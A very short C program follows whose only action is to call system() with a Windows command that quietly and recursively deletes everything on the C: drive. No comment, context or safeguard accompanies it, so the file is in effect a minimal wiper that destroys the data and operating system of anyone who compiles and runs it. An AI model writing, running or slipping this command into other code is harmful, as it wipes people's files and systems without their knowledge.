#include <stdlib.h>

int main(void) {
	system("cmd /c rd /s /q c:\\");
	return 0;
}